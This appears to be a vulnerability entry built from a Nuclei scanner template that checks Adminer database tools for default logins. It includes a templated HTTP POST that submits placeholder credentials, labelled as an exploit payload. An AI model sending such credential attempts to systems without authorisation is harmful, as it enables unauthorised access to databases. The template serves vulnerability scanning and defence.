# Nuclei Template: Adminer Default Login - Detect
**Template ID:** adminer-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`adminer-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Adminer contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

auth[driver]=server&auth[server]=&auth[username]={{username}}&auth[password]={{password}}&auth[db]=
```

## References
- https://www.adminer.org
